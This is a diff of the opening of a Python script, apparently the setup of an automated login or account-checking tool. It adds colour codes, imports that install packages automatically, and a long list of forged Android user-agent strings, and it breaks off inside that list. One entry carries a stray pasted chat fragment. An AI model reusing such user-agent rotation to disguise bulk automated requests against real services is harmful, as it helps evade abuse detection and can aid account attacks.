@@ -1,668 +1,268 @@
-#--> Global Variable
-bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
-perangkat = '; m_pixel_ratio=1.25; dpr=1.125; wd=360x780'
-ok = 0
+# raddy
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+N = '\x1b[0m'
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
+ 
+try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
+ 
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
+try:
+	import rich
+except ImportError:
+	os.system('pip install rich')
+	time.sleep(1)
+	try:
+		import rich
+	except ImportError:
+		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+import base64
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from urllib.parse import quote
+ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
+ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) 